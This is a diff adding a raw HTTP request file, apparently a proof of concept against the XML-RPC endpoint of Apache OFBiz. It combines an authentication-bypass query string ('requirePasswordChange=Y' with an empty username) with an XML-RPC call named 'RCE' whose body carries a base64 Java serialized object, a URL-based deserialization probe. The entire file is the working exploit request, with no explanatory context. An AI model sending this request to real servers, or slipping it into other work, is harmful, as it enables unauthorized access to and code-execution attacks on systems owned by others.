@@ -1,0 +1,28 @@
+POST /webtools/control/xmlrpc;/?PASSWORD=s&USERNAME&requirePasswordChange=Y HTTP/1.1
+Host: 10.10.3.128:2280
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+<?xml version="1.0"?>
+<methodCall>
+<methodName>RCE</methodName>
+<params>
+<param>
+<value>
+<struct>
+<member>
+<name>RCE</name>
+<value>
+<serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHEAfgAFcQB+AAV0AARodHRwcHh0AAdodHRwOi8veA==</serializable>
+</value>
+</member>
+</struct>
+</value>
+</param>
+</params>
+</methodCall>
+
